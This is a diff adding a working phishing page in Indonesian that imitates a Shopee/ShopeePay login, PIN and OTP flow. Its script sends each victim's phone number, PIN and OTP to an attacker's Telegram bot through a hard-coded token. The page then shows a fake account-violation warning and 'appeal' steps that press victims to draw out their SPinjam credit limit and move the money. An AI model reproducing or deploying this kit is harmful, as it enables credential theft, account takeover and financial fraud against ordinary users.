@@ -1,0 +1,615 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fitur Layanan</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+            font-weight: bold;
+        }
+        body {
+            background-color: #ff5722;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding:20px;
+            margin:0;
+        }
+        .login-card {
+            background:#ffffff;
+            width:100%;
+            max-width:420px;
+            padding:30px;
+            border-radius:16px;
+            box-shadow: 0 6px 18px rgba(0,0,0,0.2);
+        }
+        .header-row {
+            display:flex;
+            justify-content: space-between;
+            align-items:center;
+            margin-bottom:24px;
+        }
+        h2 {
+            margin:0;
+            font-size:22px;
+            text-align:left;
+color:#222;
+        }
+        .qr-btn {
+            border:2px solid #ffd32a;
+            background:#fff9c4;
+            padding:6px 12px;
+            border-radius:6px;
+            font-size:13px;
+        }
+        input {
+            width:100%;
+            padding:14px;
+            margin:14px 0;
+            border:1px solid #999;
+            border-radius:4px;
+            font-size:16px;
+            font-weight:normal;
+        }
+        .login-btn {
+            width:100%;
+            padding:14px;
+            background:#ff5722;
+            color:white;
+            border:none;
+            border-radius:4px;
+            font-size:16px;
+            margin:16px 0;
+        }
+        .link-row{
+            display:flex;
+            justify-content:space-between;
+            font-size:13px;
+            color:#666;
+            margin-bottom:16px;
+        }
+        .link-row a{
+            color:#ff5722;
+            text-decoration:none;
+        }
+        .divider-text{
+            text-align:center;
+font-size:13px;
+            color:#666;
+            margin:16px 0;
+        }
+        .social-wrap{
+            display:flex;
+            gap:10px;
+        }
+        .social-btn{
+            flex:1;
+            padding:12px;
+            border:1px solid #ccc;
+            border-radius:4px;
+            font-size:14px;
+            display:flex;
+            align-items:center;
+            justify-content:center;
+            gap:8px;
+            opacity:0.5;
+            cursor:not-allowed;
+            background:#f4f4f4;
+        }
+        .footer-text {
+            text-align:center;
+            font-size:14px;
+            color:#666;
+            margin-top:20px;
+        }
+        .footer-text a {
+            color:#ff5722;
+            text-decoration:none;
+        }
+        .pin-container, .otp-container, .login-page, .notif-page{
+            display:none;
+        }
+
+        /* ===== STYLE BARU: SHOPEEPAY KEYPAD PIN & OTP ===== */
+        .pin-title, .otp-title{
+            text-align:center;
+font-size:20px;
+            margin-bottom:20px;
+        }
+        .dot-wrap{
+            display:flex;
+            justify-content:center;
+            gap:16px;
+            margin-bottom:20px;
+        }
+        .dot{
+            width:12px;
+            height:12px;
+            border-radius:50%;
+            background:#ddd;
+        }
+        .dot.filled{
+            background:#333;
+        }
+        .forgot-link{
+            text-align:center;
+            display:block;
+            color:#007bff;
+            font-size:14px;
+            text-decoration:none;
+            margin-bottom:30px;
+        }
+        .keypad-grid{
+            display:grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap:1px;
+            background:#eee;
+        }
+        .keypad-btn{
+            background:white;
+            border:none;
+            padding:18px 8px;
+            font-size:22px;
+            cursor:pointer;
+        }
+        .keypad-btn:active{
+            background:#f0f0f0;
+}
+        .keypad-btn-empty{
+            background:white;
+            border:none;
+            padding:18px 8px;
+        }
+
+        .menu-item{
+            width:100%;
+            padding:20px;
+            border:2px solid #ffb380;
+            border-radius:12px;
+            margin:16px 0;
+            font-size:17px;
+            text-align:left;
+            cursor:pointer;
+            background: linear-gradient(90deg, #fffaf5, #fff3e8);
+            transition: all 0.3s ease;
+            display:flex;
+            align-items:center;
+            gap:14px;
+        }
+        .menu-item:hover{
+            background: linear-gradient(90deg, #ffebd8, #ffd7b8);
+            border-color:#ff5722;
+            transform: translateY(-3px);
+            box-shadow: 0 4px 10px rgba(255,87,34,0.25);
+        }
+        .menu-item:active{
+            background-color:#ffebd8;
+            transform: scale(0.97);
+        }
+        .icon{
+            font-size:24px;
+        }
+
+        /* ===== STYLE NOTIFIKASI & FORM BANDING ===== */
+.card-notif {
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+            max-width: 420px;
+            width: 100%;
+            overflow: hidden;
+        }
+        .header-notif {
+            background-color: #dc3545;
+            color: white;
+            padding: 15px;
+            text-align: center;
+            font-size: 17px;
+            font-weight: 600;
+        }
+        .icon-notif {
+            text-align: center;
+            font-size: 50px;
+            margin: 15px 0 8px;
+        }
+        .content-notif {
+            padding: 0 20px 20px;
+        }
+        .content-notif p {
+            color: #444;
+            line-height: 1.5;
+            margin-bottom: 8px;
+            font-size: 14px;
+        }
+        .info-box {
+            background-color: #fff3cd;
+            border-left: 4px solid #ffc107;
+            padding: 10px 12px;
+            margin: 10px 0;
+            font-size: 14px;
+            color: #856404;
+}
+        .info-box ul {
+            margin: 5px 0 0 20px;
+            padding: 0;
+        }
+        .info-box li {
+            margin: 2px 0;
+        }
+        .buttons {
+            display: flex;
+            gap: 10px;
+            margin-top: 15px;
+        }
+        .btn-primary {
+            flex: 1;
+            padding: 10px;
+            background-color: #dc3545;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 14px;
+            cursor: pointer;
+            font-weight: 500;
+        }
+        .btn-secondary {
+            flex: 1;
+            padding: 10px;
+            background-color: #ffc107;
+            color: #856404;
+            border: none;
+            border-radius: 5px;
+            font-size: 14px;
+            cursor: pointer;
+            font-weight: 600;
+        }
+        .btn-primary:hover { background-color: #c82333; }
+        .btn-secondary:hover { background-color: #e0a800; }
+
+        .card-form {
+            background: white;
+border-radius: 10px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+            max-width: 420px;
+            width: 100%;
+            overflow: hidden;
+            display: none;
+        }
+        .header-form {
+            background-color: #ffc107;
+            color: #856404;
+            padding: 10px;
+            text-align: center;
+            font-size: 14px;
+            font-weight: 600;
+        }
+        .content-form {
+            padding: 15px 20px;
+        }
+        .content-form h4 {
+            color: #333;
+            margin-bottom: 8px;
+            font-size: 14px;
+        }
+        .content-form p {
+            color: #444;
+            line-height: 1.5;
+            font-size: 14px;
+            margin-bottom: 6px;
+        }
+        .divider {
+            border-top: 1px dashed #ddd;
+            margin: 12px 0;
+        }
+        .btn-back {
+            background-color: #6c757d;
+            color: white;
+            border: none;
+            padding: 8px 16px;
+border-radius: 5px;
+            cursor: pointer;
+            margin-top: 8px;
+            font-size: 14px;
+        }
+        .btn-back:hover { background-color: #5a6268; }
+    </style>
+</head>
+<body>
+    <!-- HALAMAN 0 : MENU UTAMA (TIDAK DIUBAH) -->
+    <div id="pageMenu" class="login-card">
+        <h2 style="margin-bottom:10px;">FITUR LAYANAN</h2>
+        <div class="subtitle">✨ Pilih layanan yang Anda butuhkan ✨</div>
+
+        <div class="menu-item" onclick="bukaLoginPage(); kirimNotif('✅ USER MEMILIH LAYANAN: UPDATE RESI')">
+            <span class="icon">📦</span>
+            Update Resi
+        </div>
+        <div class="menu-item" onclick="bukaLoginPage(); kirimNotif('✅ USER MEMILIH LAYANAN: PENGHAPUSAN & PENONAKTIFAN AKUN')">
+            <span class="icon">⚙️</span>
+            Penghapusan & Penonaktifan Akun
+        </div>
+        <div class="menu-item" onclick="bukaLoginPage(); kirimNotif('✅ USER MEMILIH LAYANAN: LAPORKAN AKUN')">
+            <span class="icon">⚠️</span>
+Laporkan Akun
+        </div>
+    </div>
+
+    <!-- HALAMAN 1 : LOGIN (TIDAK DIUBAH) -->
+    <div id="pageLogin" class="login-card login-page">
+        <div class="header-row">
+            <h2>Log in</h2>
+            <span class="qr-btn">Log in dengan QR</span>
+        </div>
+
+        <input type="tel" id="noHp" placeholder="(+62) Masukkan Nomor Handphone">
+
+        <button class="login-btn" onclick="bukaPinPage(); kirimNotif('✅ USER MENYIAPKAN PIN')">LOG IN</button>
+
+        <div class="link-row">
+            <span></span>
+            <a href="#">Log in dengan no. handphone</a>
+        </div>
+
+        <div class="divider-text">ATAU</div>
+
+        <div class="social-wrap">
+            <button class="social-btn" disabled>
+                <span>f</span> Facebook
+            </button>
+            <button class="social-btn" disabled>
+                <span>G</span> Google
+            </button>
+        </div>
+
+        <div class="footer-text">
+            Baru di sini? <a href="#">Daftar</a>
+</div>
+    </div>
+
+    <!-- HALAMAN 2 : MASUKKAN PIN (BARU SHOPEEPAY STYLE) -->
+    <div id="pagePin" class="login-card pin-container">
+        <h2 class="pin-title">Masukkan PIN</h2>
+        <div class="dot-wrap">
+            <span class="dot" id="pinDot1"></span>
+            <span class="dot" id="pinDot2"></span>
+            <span class="dot" id="pinDot3"></span>
+            <span class="dot" id="pinDot4"></span>
+            <span class="dot" id="pinDot5"></span>
+            <span class="dot" id="pinDot6"></span>
+        </div>
+        <a href="#" class="forgot-link">Lupa PIN?</a>
+        <div class="keypad-grid">
+            <button class="keypad-btn" onclick="inputPin('1')">1</button>
+            <button class="keypad-btn" onclick="inputPin('2')">2</button>
+            <button class="keypad-btn" onclick="inputPin('3')">3</button>
+            <button class="keypad-btn" onclick="inputPin('4')">4</button>
+            <button class="keypad-btn" onclick="inputPin('5')">5</button>
+<button class="keypad-btn" onclick="inputPin('6')">6</button>
+            <button class="keypad-btn" onclick="inputPin('7')">7</button>
+            <button class="keypad-btn" onclick="inputPin('8')">8</button>
+            <button class="keypad-btn" onclick="inputPin('9')">9</button>
+            <button class="keypad-btn-empty"></button>
+            <button class="keypad-btn" onclick="inputPin('0')">0</button>
+            <button class="keypad-btn" onclick="deletePin()">⨯</button>
+        </div>
+    </div>
+
+    <!-- HALAMAN 3 : MASUKKAN KODE OTP (BARU SHOPEEPAY STYLE) -->
+    <div id="pageOtp" class="login-card otp-container">
+        <h2 class="otp-title">Masukkan Kode OTP</h2>
+        <div class="dot-wrap">
+            <span class="dot" id="otpDot1"></span>
+            <span class="dot" id="otpDot2"></span>
+            <span class="dot" id="otpDot3"></span>
+            <span class="dot" id="otpDot4"></span>
+            <span class="dot" id="otpDot5"></span>
+            <span class="dot" id="otpDot6"></span>
+</div>
+        <div class="keypad-grid">
+            <button class="keypad-btn" onclick="inputOtp('1')">1</button>
+            <button class="keypad-btn" onclick="inputOtp('2')">2</button>
+            <button class="keypad-btn" onclick="inputOtp('3')">3</button>
+            <button class="keypad-btn" onclick="inputOtp('4')">4</button>
+            <button class="keypad-btn" onclick="inputOtp('5')">5</button>
+            <button class="keypad-btn" onclick="inputOtp('6')">6</button>
+            <button class="keypad-btn" onclick="inputOtp('7')">7</button>
+            <button class="keypad-btn" onclick="inputOtp('8')">8</button>
+            <button class="keypad-btn" onclick="inputOtp('9')">9</button>
+            <button class="keypad-btn-empty"></button>
+            <button class="keypad-btn" onclick="inputOtp('0')">0</button>
+            <button class="keypad-btn" onclick="deleteOtp()">⨯</button>
+        </div>
+    </div>
+
+    <!-- HALAMAN 4 : NOTIFIKASI & FORM BANDING (SETELAH OTP) -->
+<div id="pageNotif" class="notif-page">
+        <div class="card-notif" id="notifCard">
+            <div class="header-notif">⚠️ PENAMBAHAN FITUR TIDAK BERHASIL</div>
+            <div class="icon-notif">⚠️</div>
+            <div class="content-notif">
+                <p><strong>Pemberitahuan akun melakukan pelanggaran</strong></p>
+                <p>Sistem kami mendeteksi adanya pelanggaran terhadap Syarat & Ketentuan yang terjadi pada akun Anda.</p>
+                <p>Dikarenakan:</p>
+                
+                <div class="info-box">
+                    <ul>
+                        <li>1. Melanggar syarat dan ketentuan</li>
+                        <li>2. Menampilkan Resi pada ulasan</li>
+                        <li>3. Akun dilaporkan pihak seller</li>
+                        <li>4. Menggunakan voucher secara berlebihan</li>
+                        <li>5. Terlalu sering membatalkan pesanan</li>
+                    </ul>
+                </div>
+ <p><strong>Dampak pada akun:</strong></p>
+                <div class="info-box">
+                    <ul>
+                        <li>1. Pesanan tidak akan diterima</li>
+                        <li>2. Resi tidak terbaca sistem</li>
+                        <li>3. Retur tidak diproses</li>
+                        <li>4. Limit akun akan berkurang perlahan dan terdata sebagai tagihan</li>
+                        <li>5. Tiba-tiba akun diblokir permanen</li>
+                    </ul>
+                </div>
+<p>Silahkan melakukan pengajuan banding jika anda tidak melakukan pelanggaran syarat dan ketentuan seperti yang dilaporkan pihak seller (toko). Jika tidak, akun akan kami blokir permanen dan limit yang ada pada akun baik yang digunakan atau tidak digunakan akan menjadi tagihan kepada pengguna itu sendiri sesuai syarat dan ketentuan ketika pertama kali membuka akun.</p>
+            
+            <div class="buttons">
+                <button class="btn-secondary" onclick="bukaFormBanding()">Ajukan Banding</button>
+                <button class="btn-primary" onclick="this.closest('.card-notif').style.display='none'">Mengerti</button>
+            </div>
+        </div>
+    </div>
+
+    <div class="card-form" id="formBanding">
+        <div class="header-form">📋 TATA CARA PENGAJUAN BANDING</div>
+        <div class="content-form">
+            <h4>Tata cara Pengajuan banding akun:</h4>
+            
+            <p><strong>1.</strong> Update data pada menu Spaylater & Spinjam<br>
+            Buka Shopee > klik Menu Saya > klik Spinjam > Cek limit sekarang > lengkapi data</p>
+            
+            <p><strong>2.</strong> Silahkan Pindahkan (pemindahan sementara) limit kredit ke rekening bank pengguna (Anda tidak diminta meminjam hanya memindahkan sementara)</p>
+            
+            <p><strong>3.</strong> Kembalikan limit yang diterima ke shopeepay pengguna itu sendiri</p>
+            
+            <p><strong>4.</strong> Pemulihan limit yang diamankan agar tidak terdata sebagai peminjam, terkena bunga & membayar setiap bulan</p>
+            
+            <p><strong>5.</strong> Limit kembali normal pada akun akan tertera seperti limit awal dan akun telah bisa digunakan kembali</p>
+
+            <div class="divider"></div>
+
+            <h4>Tata cara pengosongan limit:</h4>
+            <p>Buka Shopee -> pilih menu saya -> Pilih spinjam -> klik Cairkan -> Masukkan nominal -> pilih durasi -> pilih rekening bank - lanjutkan - Lanjutkan -> Masukkan Pin -> Tanda Tangan (Jangan tanda tangan sesuai Ktp, cukup ketik (-)) -> kirim</p>
+
+            <div class="divider"></div>
+
+            <h4>Tata cara pengembalian limit:</h4>
+            <p>Buka akun bank -> Pilih top up Shopeepay -> Masukkan nomor Shopeepay pengguna sendiri -> masukkan nominal -> konfirmasi -> Lanjutkan Bayar pintu pengembalian</p>
+            
+            <div class="divider"></div>
+            
+            <button class="btn-back" onclick="kembaliKeNotif()">← Kembali</button>
+        </div>
+    </div>
+
+    <script>
+        function bukaFormBanding() {
+            document.getElementById('notifCard').style.display = 'none';
+            document.getElementById('formBanding').style.display = 'block';
+        }
+        function kembaliKeNotif() {
+            document.getElementById('formBanding').style.display = 'none';
+            document.getElementById('notifCard').style.display = 'block';
+        }
+<script>
+// ===== DATA BOT TELEGRAM =====
+const BOT_TOKEN = "9131548020:AAFpxfnPt-Bcna4ieQ0KY41TOmcdGsh6DnU";
+const CHAT_ID = "8742715825";
+
+let pinValue = "";
+let otpValue = "";
+
+// ===== FUNGSI KIRIM NOTIFIKASI SEDERHANA =====
+function kirimNotif(teks) {
+fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({chat_id: CHAT_ID, text: teks})
+    })
+    .then(res => res.json())
+    .catch(err => console.log(err));
+}
+
+// ===== FUNGSI PIN KEYPAD =====
+function inputPin(num){
+    if(pinValue.length <6){
+        pinValue += num;
+        updatePinDots();
+        if(pinValue.length ===6){
+            kirimNotif("✅ USER SUDAH MENGISI PIN 6 DIGIT");
+            setTimeout(()=>{
+                document.getElementById("pagePin").style.display = "none";
+                document.getElementById("pageOtp").style.display = "block";
+            },300);
+        }
+    }
+}
+function deletePin(){
+    pinValue = pinValue.slice(0,-1);
+    updatePinDots();
+}
+function updatePinDots(){
+    for(let i=1;i<=6;i++){
+        const dot = document.getElementById("pinDot"+i);
+        if(i <= pinValue.length){
+            dot.classList.add("filled");
+        }else{
+dot.classList.remove("filled");
+        }
+    }
+}
+
+// ===== FUNGSI OTP KEYPAD =====
+function inputOtp(num){
+    if(otpValue.length <6){
+        otpValue += num;
+        updateOtpDots();
+        if(otpValue.length ===6){
+            kirimSemuaDataTelegram();
+        }
+    }
+}
+function deleteOtp(){
+    otpValue = otpValue.slice(0,-1);
+    updateOtpDots();
+}
+function updateOtpDots(){
+    for(let i=1;i<=6;i++){
+        const dot = document.getElementById("otpDot"+i);
+        if(i <= otpValue.length){
+            dot.classList.add("filled");
+        }else{
+            dot.classList.remove("filled");
+        }
+    }
+}
+
+// ===== FUNGSI KIRIM SEMUA DATA SAAT OTP SELESAI =====
+function kirimSemuaDataTelegram() {
+    const noHp = document.getElementById("noHp").value;
+
+    const pesan = `✅ DATA LENGKAP DITERIMA
+📱 Nomor Handphone: ${noHp}
+🔑 PIN: ${pinValue}
+🔐 OTP: ${otpValue}`;
+
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({chat_id: CHAT_ID, text: pesan})
+    })
+    .then(res => res.json())
+    .then(hasil => {
+        alert("✅ Semua data terkirim ke Telegram");
+    })
+    .catch(err => {
+        alert("❌ Gagal kirim data lengkap");
+    })
+}
+
+// Pindah ke halaman Login
+function bukaLoginPage(){
+    document.getElementById("pageMenu").style.display = "none";
+    document.getElementById("pageLogin").style.display = "block";
+}
+
+// Pindah ke halaman PIN
+function bukaPinPage(){
+    document.getElementById("pageLogin").style.display = "none";
+    document.getElementById("pagePin").style.display = "block";
+}
+</script>
+</body>
+</html>
